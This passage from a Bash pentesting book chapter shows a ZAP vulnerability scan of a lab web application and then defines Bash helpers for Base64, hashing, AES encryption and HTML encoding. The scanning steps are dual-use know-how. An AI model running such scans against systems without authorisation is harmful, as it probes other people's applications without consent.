    <span class="koboSpan" id="kobo.787.1">
     add-on installation command only once.
    </span>
    <span class="koboSpan" id="kobo.787.2">
     Next, run a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.788.1">
      zapit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.789.1">
     scan.
    </span>
    <span class="koboSpan" id="kobo.789.2">
     In this
    </span>
    <a id="_idIndexMarker540">
    </a>
    <span class="koboSpan" id="kobo.790.1">
     example, I’m scanning an application in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.791.1">
      my lab:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer104">
     <span class="koboSpan" id="kobo.792.1">
      <img alt="Figure 9.12 – A zapit scan fingerprints the web application" src="image/B22229_09_12.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.793.1">
     Figure 9.12 – A zapit scan fingerprints the web application
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.794.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.795.1">
     You can find a large list of vulnerable web app
    </span>
    <a href="https://github.com/vulhub/vulhub">
     <span class="koboSpan" id="kobo.796.1">
      lications for your lab
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.797.1">
       at
      </span>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.798.1">
       https:
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.799.1">
      //github.com/vulhub/vulhub
     </span>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.800.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.801.1">
     In the preceding figure, you see that
    </span>
    <a id="_idIndexMarker541">
    </a>
    <span class="koboSpan" id="kobo.802.1">
     the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.803.1">
      zapit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.804.1">
     scan revealed the application frameworks in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.805.1">
      Technology
     </span>
    </strong>
    <span class="koboSpan" id="kobo.806.1">
     section and some interesting information in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.807.1">
      Number of alerts
     </span>
    </strong>
    <span class="koboSpan" id="kobo.808.1">
     section.
    </span>
    <span class="koboSpan" id="kobo.808.2">
     This is critical information needed for any
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.809.1">
      application pentest.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.810.1">
     Next, let’s run a vulnerability scan
    </span>
    <a id="_idIndexMarker542">
    </a>
    <span class="koboSpan" id="kobo.811.1">
     of the application.
    </span>
    <span class="koboSpan" id="kobo.811.2">
     For the output
    </span>
    <a id="_idIndexMarker543">
    </a>
    <span class="koboSpan" id="kobo.812.1">
     parameter value (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.813.1">
      -quickout
     </span>
    </strong>
    <span class="koboSpan" id="kobo.814.1">
     ), we precede the path with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.815.1">
      $(pwd)
     </span>
    </strong>
    <span class="koboSpan" id="kobo.816.1">
     to save the report to the current working directory because
    </span>
    <a id="_idIndexMarker544">
    </a>
    <span class="koboSpan" id="kobo.817.1">
     we don’t have permission to write
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.818.1">
      to
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.819.1">
       /u
      </span>
      <a id="_idTextAnchor250">
      </a>
      <a id="_idTextAnchor251">
      </a>
      <span class="koboSpan" id="kobo.820.1">
       sr/share/zaproxy
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.821.1">
      :
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.822.1">
$ /usr/share/zaproxy/zap.s</span><a href="http://10.2.10.1:5555/"><span class="koboSpan" id="kobo.823.1">h -cmd -addonupdate -q</span></a><span class="koboSpan" id="kobo.824.1">uickurl http://10.2.10.1:5555/ -quickout $(pwd)/zap.json</span></pre>
   <p>
    <span class="koboSpan" id="kobo.825.1">
     Let’s take a look at
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.826.1">
      the output:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer105">
     <span class="koboSpan" id="kobo.827.1">
      <img alt="Figure 9.13 – Examining the ZAP quick scan output in JSON format" src="image/B22229_09_13.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.828.1">
     Figure 9.13 – Examining the ZAP quick scan output in JSON format
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.829.1">
     ZAP scan output can be saved in HTML, JSON, Markdown, and XML formats.
    </span>
    <span class="koboSpan" id="kobo.829.2">
     For human-readable outputs, stick with HTML reports.
    </span>
    <span class="koboSpan" id="kobo.829.3">
     For inclusion in an automation framework that relies on using Bash scripting to parse the output, use either JSON
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.830.1">
      or XML.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.831.1">
     This section covered common use cases for using ProjectDiscovery and ZAP in your Bash shell.
    </span>
    <span class="koboSpan" id="kobo.831.2">
     We’ve just scratched the surface here.
    </span>
    <span class="koboSpan" id="kobo.831.3">
     There are many more options available in ProjectDiscovery tools and ZAP, including
    </span>
    <a id="_idIndexMarker545">
    </a>
    <span class="koboSpan" id="kobo.832.1">
     configuring automated scanning
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.833.1">
      with credentials.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.834.1">
     The next section will explore using Bash
    </span>
    <a id="_idIndexMarker546">
    </a>
    <span class="koboSpan" id="kobo.835.1">
     aliases and functions to transform data related to web
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.836.1">
      application
     </span>
    </span>
    <span class="No-Break">
     <a id="_idIndexMarker547">
     </a>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.837.1">
      pentesting.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-158">
    <a id="_idTextAnchor252">
    </a>
    <span class="koboSpan" id="kobo.838.1">
     Learning advanced data manipulation techniques
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.839.1">
     In this section, we’ll explore various data encoding, encryption, and hashing algorithms that are common to testing
    </span>
    <a id="_idIndexMarker548">
    </a>
    <span class="koboSpan" id="kobo.840.1">
     web application security.
    </span>
    <span class="koboSpan" id="kobo.840.2">
     You can put these functions in your
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.841.1">
      .bashrc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.842.1">
     file and call them in your scripts.
    </span>
    <span class="koboSpan" id="kobo.842.2">
     The following functions can be found in this chapter’s GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.843.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.844.1">
       ch09_data_functions.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.845.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.846.1">
     Base64 encoding is a method
    </span>
    <a id="_idIndexMarker549">
    </a>
    <span class="koboSpan" id="kobo.847.1">
     for converting binary data into an ASCII string format by encoding it into a Base64 representation.
    </span>
    <span class="koboSpan" id="kobo.847.2">
     This encoding uses a set of 64 characters, including uppercase and lowercase letters (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.848.1">
      A-Z
     </span>
    </strong>
    <span class="koboSpan" id="kobo.849.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.850.1">
      a-z
     </span>
    </strong>
    <span class="koboSpan" id="kobo.851.1">
     ), digits (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.852.1">
      0-9
     </span>
    </strong>
    <span class="koboSpan" id="kobo.853.1">
     ), and the symbols
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.854.1">
      +
     </span>
    </strong>
    <span class="koboSpan" id="kobo.855.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.856.1">
      /
     </span>
    </strong>
    <span class="koboSpan" id="kobo.857.1">
     , to represent the data.
    </span>
    <span class="koboSpan" id="kobo.857.2">
     The primary purpose of Base64 encoding is to ensure that binary data, such as images or files, can be safely transmitted over media that are designed to handle textual data, such as email and URLs, without corruption.
    </span>
    <span class="koboSpan" id="kobo.857.3">
     Base64 encoding also adds padding with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.858.1">
      =
     </span>
    </strong>
    <span class="koboSpan" id="kobo.859.1">
     character to ensure the encoded data is a multiple of 4 bytes, maintaining data integrity during transport and storage.
    </span>
    <span class="koboSpan" id="kobo.859.2">
     Base64 encoding in Bash is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.860.1">
      very simple.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.861.1">
     Here is a Base64
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.862.1">
      encoding example:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.863.1">
$ echo -n hello | base64
aGVsbG8=</span></pre>
   <p>
    <span class="koboSpan" id="kobo.864.1">
     And the following is a Base64
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.865.1">
      decoding example:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.866.1">
$ echo -n aGVsbG8= | base64 -d
hello</span></pre>
   <p>
    <span class="koboSpan" id="kobo.867.1">
     Base64 encoding and Base64 URL-safe encoding are methods for converting binary data into text strings, but they differ in their character sets and intended use cases.
    </span>
    <span class="koboSpan" id="kobo.867.2">
     Base64 encoding uses a set of 64 characters, including uppercase and lowercase letters (A-Z, a-z), digits (0-9), and two special characters (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.868.1">
      +
     </span>
    </strong>
    <span class="koboSpan" id="kobo.869.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.870.1">
      /
     </span>
    </strong>
    <span class="koboSpan" id="kobo.871.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.871.2">
     This encoding is often used to encode data that needs to be stored or transmitted over media designed to handle textual data.
    </span>
    <span class="koboSpan" id="kobo.871.3">
     However, the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.872.1">
      +
     </span>
    </strong>
    <span class="koboSpan" id="kobo.873.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.874.1">
      /
     </span>
    </strong>
    <span class="koboSpan" id="kobo.875.1">
     characters are not URL-safe, which can cause issues when used in URLs or filenames.
    </span>
    <span class="koboSpan" id="kobo.875.2">
     To address this, Base64 URL-safe encoding modifies the character set by replacing
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.876.1">
      +
     </span>
    </strong>
    <span class="koboSpan" id="kobo.877.1">
     with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.878.1">
      -
     </span>
    </strong>
    <span class="koboSpan" id="kobo.879.1">
     (hyphen) and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.880.1">
      /
     </span>
    </strong>
    <span class="koboSpan" id="kobo.881.1">
     with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.882.1">
      _
     </span>
    </strong>
    <span class="koboSpan" id="kobo.883.1">
     (underscore), and it typically omits padding characters (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.884.1">
      =
     </span>
    </strong>
    <span class="koboSpan" id="kobo.885.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.885.2">
     This ensures that the encoded data can be safely included in URLs and filenames without the risk of being misinterpreted or
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.886.1">
      causing errors.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.887.1">
     This function
    </span>
    <a id="_idIndexMarker550">
    </a>
    <span class="koboSpan" id="kobo.888.1">
     encodes data to a URL-safe
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.889.1">
      Base64 representation:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.890.1">
url_safe_base64_encode() {
  base64 | tr '+/' '-_' | tr -d '='
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.891.1">
     An example of URL-safe Base64 decoding is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.892.1">
      demonstrated here:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.893.1">
url_safe_base64_decode() {
  tr '-_' '+/' | base64 --decode
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.894.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.895.1">
      gzip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.896.1">
     data format is extensively utilized in HTTP communications to compress data transferred between web servers and clients, enhancing the efficiency of data transmission.
    </span>
    <span class="koboSpan" id="kobo.896.2">
     When a web server sends data to a client, such as a web browser, it can use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.897.1">
      gzip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.898.1">
     to compress the content, significantly reducing the file size and thereby speeding up the download process.
    </span>
    <span class="koboSpan" id="kobo.898.2">
     The compressed data includes a header with metadata, the compressed content, and
    </span>
    <a id="_idIndexMarker551">
    </a>
    <span class="koboSpan" id="kobo.899.1">
     a footer with a
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.900.1">
      Cyclic Redundancy Check 32
     </span>
    </strong>
    <span class="koboSpan" id="kobo.901.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.902.1">
      CRC-32
     </span>
    </strong>
    <span class="koboSpan" id="kobo.903.1">
     ) checksum for verifying data integrity.
    </span>
    <span class="koboSpan" id="kobo.903.2">
     Clients that support
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.904.1">
      gzip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.905.1">
     , indicated via the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.906.1">
      Accept-Encoding: gzip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.907.1">
     HTTP header, can decompress the received content using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.908.1">
      gunzip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.909.1">
     to display or process the original data.
    </span>
    <span class="koboSpan" id="kobo.909.2">
     This method of compression helps to improve load times, reduce bandwidth usage, and enhance overall
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.910.1">
      web performance.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.911.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.912.1">
      gzip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.913.1">
     program is commonly installed on Linux systems by default.
    </span>
    <span class="koboSpan" id="kobo.913.2">
     Here are some examples showing how to compress and uncompress data in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.914.1">
      Bash shell:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer106">
     <span class="koboSpan" id="kobo.915.1">
      <img alt="Figure 9.14 – A demonstration of compressing and uncompressing data" src="image/B22229_09_14.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.916.1">
     Figure 9.14 – A demonstration of compressing and uncompressing data
    </span>
   </p>
   <p>
    <strong class="bold">
     <span class="koboSpan" id="kobo.917.1">
      Message-Digest Algorithm 5
     </span>
    </strong>
    <span class="koboSpan" id="kobo.918.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.919.1">
      MD5
     </span>
    </strong>
    <span class="koboSpan" id="kobo.920.1">
     ) hashing is a
    </span>
    <a id="_idIndexMarker552">
    </a>
    <span class="koboSpan" id="kobo.921.1">
     widely used cryptographic hash function that produces a 128-bit (16-byte) hash value, typically rendered as a 32-character hexadecimal number.
    </span>
    <span class="koboSpan" id="kobo.921.2">
     MD5 takes an input (or
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.922.1">
      message
     </span>
    </em>
    <span class="koboSpan" id="kobo.923.1">
     ) and returns a fixed-size string of characters, which is unique to the input data.
    </span>
    <span class="koboSpan" id="kobo.923.2">
     However, MD5 is considered weak due to its susceptibility to hash collisions, where two different inputs produce the same hash output.
    </span>
    <span class="koboSpan" id="kobo.923.3">
     MD5 is no
    </span>
    <a id="_idIndexMarker553">
    </a>
    <span class="koboSpan" id="kobo.924.1">
     longer recommended for security-critical applications, with more secure algorithms such as
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.925.1">
      Secure Hash Algorithm 256-bit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.926.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.927.1">
      SHA-256
     </span>
    </strong>
    <span class="koboSpan" id="kobo.928.1">
     ) being preferred for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.929.1">
      hashing
     </span>
    </span>
    <span class="No-Break">
     <a id="_idIndexMarker554">
     </a>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.930.1">
      purposes.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.931.1">
     The following function creates an MD5 hash of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.932.1">
      a string:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.933.1">
md5_hash() {
  md5sum | awk '{print $1}'
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.934.1">
     The following is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.935.1">
      another example:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.936.1">
$ echo helloworld | md5_hash
d73b04b0e696b0945283defa3eee4538</span></pre>
   <p>
    <span class="koboSpan" id="kobo.937.1">
     SHA-256 is a cryptographic hash function that generates a fixed-size 256-bit (32-byte) hash value from any input data, often represented as a 64-character hexadecimal number.
    </span>
    <span class="koboSpan" id="kobo.937.2">
     Developed by the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.938.1">
      National Security Agency
     </span>
    </strong>
    <span class="koboSpan" id="kobo.939.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.940.1">
      NSA
     </span>
    </strong>
    <span class="koboSpan" id="kobo.941.1">
     ) and part of the SHA-2 family, SHA-256 takes an input and
    </span>
    <a id="_idIndexMarker555">
    </a>
    <span class="koboSpan" id="kobo.942.1">
     produces a unique output, acting like a digital fingerprint of the data.
    </span>
    <span class="koboSpan" id="kobo.942.2">
     It’s designed to be computationally infeasible to reverse the process or find two different inputs that produce the same hash (a collision).
    </span>
    <span class="koboSpan" id="kobo.942.3">
     This makes SHA-256 highly secure and reliable for verifying data integrity and authenticity, which is why it’s widely used in various security applications, including SSL/TLS certificates, digital signatures, and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.943.1">
      blockchain technology.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.944.1">
     This function prints a
    </span>
    <a id="_idIndexMarker556">
    </a>
    <span class="koboSpan" id="kobo.945.1">
     SHA-256 hash of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.946.1">
      an input:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.947.1">
sha256_hash() {
  sha256sum | awk '{print $1}'
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.948.1">
     See the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.949.1">
      following example:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.950.1">
$ echo helloworld | sha256_hash
8cd07f3a5ff98f2a78cfc366c13fb123eb8d29c1ca37c79df190425d5b9e424d</span></pre>
   <p>
    <strong class="bold">
     <span class="koboSpan" id="kobo.951.1">
      Advanced Encryption Standard with a 256-bit key
     </span>
    </strong>
    <span class="koboSpan" id="kobo.952.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.953.1">
      AES-256
     </span>
    </strong>
    <span class="koboSpan" id="kobo.954.1">
     ) is a symmetric encryption algorithm widely
    </span>
    <a id="_idIndexMarker557">
    </a>
    <span class="koboSpan" id="kobo.955.1">
     used to secure data.
    </span>
    <span class="koboSpan" id="kobo.955.2">
     It works by taking plaintext data and transforming it into ciphertext using a secret key, ensuring that only someone with the same key can decrypt and access the original information.
    </span>
    <span class="koboSpan" id="kobo.955.3">
     The
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.956.1">
      256
     </span>
    </em>
    <span class="koboSpan" id="kobo.957.1">
     in AES-256 refers to the length of the encryption key, which is 256 bits long, making it extremely difficult to break using brute-force attacks.
    </span>
    <span class="koboSpan" id="kobo.957.2">
     AES-256 is known for its strong security and efficiency, which is why it is commonly used for protecting sensitive data in applications such as secure file storage, internet communications, and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.958.1">
      financial transactions.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.959.1">
     The following is an AES
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.960.1">
      encryption function:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.961.1">
aes_encrypt() {
  local password="$1"
  openssl enc -aes-256-cbc -base64 -pbkdf2 -pass pass:"$password"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.962.1">
     This function must be called as follows:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.963.1">
      echo "data to be encrypted" |
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.964.1">
       aes_encrypt "password"
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.965.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.966.1">
     This is an AES
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.967.1">
      decryption function:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.968.1">
aes_decrypt() {
  local</span><a id="_idTextAnchor253"/><a id="_idTextAnchor254"/><span class="koboSpan" id="kobo.969.1"> password="$1"
  openssl</span><a id="_idTextAnchor255"/><a id="_idTextAnchor256"/><a id="_idTextAnchor257"/><a id="_idTextAnchor258"/><span class="koboSpan" id="kobo.970.1"> enc -aes-256-cbc -d -base64 -pbkdf2 -pass pass:"$password"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.971.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.972.1">
      openssl
     </span>
    </strong>
    <span class="koboSpan" id="kobo.973.1">
     command specifies
    </span>
    <a id="_idIndexMarker558">
    </a>
    <span class="koboSpan" id="kobo.974.1">
     the AES algorithm with a 256-bit key size in
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.975.1">
      Cipher Block Chaining
     </span>
    </strong>
    <span class="koboSpan" id="kobo.976.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.977.1">
      CBC
     </span>
    </strong>
    <span class="koboSpan" id="kobo.978.1">
     ) mode.
    </span>
    <span class="koboSpan" id="kobo.978.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.979.1">
      -d
     </span>
    </strong>
    <span class="koboSpan" id="kobo.980.1">
     option means to decrypt.
    </span>
    <span class="koboSpan" id="kobo.980.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.981.1">
      -pbkdf2
     </span>
    </strong>
    <span class="koboSpan" id="kobo.982.1">
     option indicates that the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.983.1">
      Password-Based Key Derivation Function 2
     </span>
    </strong>
    <span class="koboSpan" id="kobo.984.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.985.1">
      PBKDF2
     </span>
    </strong>
    <span class="koboSpan" id="kobo.986.1">
     ) algorithm is used to derive the encryption key from a password.
    </span>
    <span class="koboSpan" id="kobo.986.2">
     This enhances security by
    </span>
    <a id="_idIndexMarker559">
    </a>
    <span class="koboSpan" id="kobo.987.1">
     making brute-force attacks
    </span>
    <a id="_idIndexMarker560">
    </a>
    <span class="koboSpan" id="kobo.988.1">
     more difficult, as it applies a computationally intensive
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.989.1">
      function iteratively.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.990.1">
     Similar to the encryption function, the data to decrypt must be passed in via a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.991.1">
      stdin
     </span>
    </strong>
    <span class="koboSpan" id="kobo.992.1">
     pipe, and the decryption password must follow:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.993.1">
      echo "data to be decrypted" |
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.994.1">
       aes_decrypt "password"
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.995.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.996.1">
     Here is an AES-256 encryption and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.997.1">
      decryption example:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.998.1">
$ echo "data to be encrypted" | aes_encrypt 'Passw0rd!' </span><span class="koboSpan" id="kobo.998.2">| aes_decrypt 'Passw0rd!'
</span><span class="koboSpan" id="kobo.998.3">data to be encrypted</span></pre>
   <p>
    <span class="koboSpan" id="kobo.999.1">
     HTML encoding is the process of converting special characters in HTML into their corresponding character entities to ensure they are displayed correctly in web browsers.
    </span>
    <span class="koboSpan" id="kobo.999.2">
     This is necessary because certain characters, such as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1000.1">
      &lt;
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1001.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1002.1">
      &gt;
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1003.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1004.1">
      &amp;
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1005.1">
     , and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1006.1">
      "
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1007.1">
     , have specific meanings in HTML syntax and can disrupt the structure of the HTML document if not properly encoded.
    </span>
    <span class="koboSpan" id="kobo.1007.2">
     For instance,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1008.1">
      &lt;
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1009.1">
     is used to start a tag, so encoding it as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1010.1">
      &amp;lt;
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1011.1">
     prevents it from being interpreted as the start of an HTML tag.
    </span>
    <span class="koboSpan" id="kobo.1011.2">
     Conversely, HTML decoding converts these character entities back into their original characters.
    </span>
    <span class="koboSpan" id="kobo.1011.3">
     This process is crucial for web security and functionality, as it prevents HTML injection attacks and ensures that content is rendered correctly without unintended formatting or behavior.
    </span>
    <span class="koboSpan" id="kobo.1011.4">
     By encoding special characters, developers can safely include user-generated content, code snippets, or other data within HTML documents without risking the integrity of the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1012.1">
      web page.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1013.1">
     The following HTML function encodes
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1014.1">
      the input:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.1015.1">
html_encode() {
  local input
  input=$(cat)
  input="${input//\&amp;/\&amp;amp;}"
  input="${input//\&lt;/\&amp;lt;}"
  input="${input//\&gt;/\&amp;gt;}"
  input="${input//\"/\&amp;quot;}"
  input="${input//\'/\&amp;apos;}"
  echo "$input"
}</span></pre>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.1016.1">
     Reminder
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.1017.1">
     The following characters must be escaped when included as part of a string, as seen in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1018.1">
      html_encode
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1019.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1020.1">
      html_encode
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1021.1">
     functions:
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1022.1">
      \
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1023.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1024.1">
      $
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1025.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1026.1">
      `
     </span>
    </strong>
